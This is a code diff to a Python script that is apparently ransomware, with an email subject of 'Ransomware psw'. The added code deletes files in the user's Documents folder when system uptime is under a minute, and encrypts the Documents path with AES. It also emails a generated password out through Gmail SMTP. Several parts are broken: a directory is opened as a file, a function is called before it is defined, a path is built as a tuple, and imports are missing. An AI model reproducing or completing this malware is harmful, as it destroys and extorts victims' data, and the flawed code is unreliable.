@@ -6,53 +6,93 @@ from tkinter import messagebox
 import os
 from time import sleep
 import shutil as st
+from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 import random 
 import string
+import shutil
+import psutil
+import time
+
+
+uptime = time.time() - psutil.boot_time()
+if uptime < 60:
+    delete_all()
+
 
 def crypter():
+    def generate_password(length):
+        characters = string.ascii_letters + string.digits + string.punctuation
+        password = ''.join(random.choice(characters) for i in range(length))
+        return password
+    
+    
+    
+    def encrypt_file(file_path, password):
+        with open(file_path, 'rb') as file:
+            file_data = file.read()
 
-    import os
-    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-    from cryptography.hazmat.backends import default_backend
+            padder = padding.PKCS7(128).padder()
+            padded_data = padder.update(file_data) + padder.finalize()
 
-    def encrypt_path(key, path):
-        backend = default_backend()
-        iv = os.urandom(16)
-        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=backend)
-        encryptor = cipher.encryptor()
+            key = os.urandom(32)  # Generate a random 256-bit key
+            iv = os.urandom(16)  # Generate a random 128-bit IV
 
-        encrypted_path = encryptor.update(path.encode()) + encryptor.finalize()
+            cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
+            encryptor = cipher.encryptor()
+            encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
 
-        return iv + encrypted_path
+            with open(file_path + '.enc', 'wb') as encrypted_file:
+                encrypted_file.write(key)
+                encrypted_file.write(iv)
+                encrypted_file.write(encrypted_data)
 
-    def crypt():
-        key = os.urandom(16)  # Should be 16, 24, or 32 bytes long
-        path = r'C:\path\to\file.txt'
-        encrypted_path = encrypt_path(key, path)
+            return key, iv
 
-        with open('encrypted_file.txt', 'wb') as f:
-            f.write(encrypted_path)
+    def sendpsw(psw):
+        email = "your_email@gmail.com"
+        password = "your_password"
+        to_email = "recipient_email@example.com"
 
-        print("File encrypted successfully.")
+        message = MIMEMultipart()
+        message["From"] = email
+        message["To"] = to_email
+        message["Subject"] = "Ransomware psw"
 
-    crypt()
+        # Email body
+        body = psw
+        message.attach(MIMEText(body, "plain"))
+
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, to_email, message.as_string())
+        server.quit()
+
+        print("Email sent successfully!")
+
+    dir_path = os.path.join('C:\\Users\\', os.getlogin(), 'Documents')
+    newborn_psw = generate_password(15)
+    encrypt_file(dir_path, newborn_psw)
+    sendpsw(newborn_psw)
 def delete_all():
 
     try:
-        st.rmtree(path)
-        print(f"{path} successfully wiped.")
-    except FileNotFoundError:
-        print(f"{path} does not exist.")
-    except PermissionError:
-        print(f"Permission denied for {path}.")
-    except Exception as e:
-        print(f"An error occurred: {e}")
+        dir_path =  ('C:\\Users\\', os.getlogin(),'\\Documents') # <---- here you can add more than 1 path.
+        dir_contents = os.listdir(dir_path)
+        # Follow this code for all of the paths that you want to add.
+        for item in dir_contents:
+            item_path = os.path.join(dir_path, item)
+            
+            if os.path.isfile(item_path):
+                os.remove(item_path)
+            elif os.path.isdir(item_path):
+                os.rmdir(item_path)
 
-    if __name__ == "__main__":
-        path = "/user/carlo"
-        delete_all(path)
+    except PermissionError:
+        print('Need more privileges')
+
 def use():
     root = tk.Tk()
     crypter()
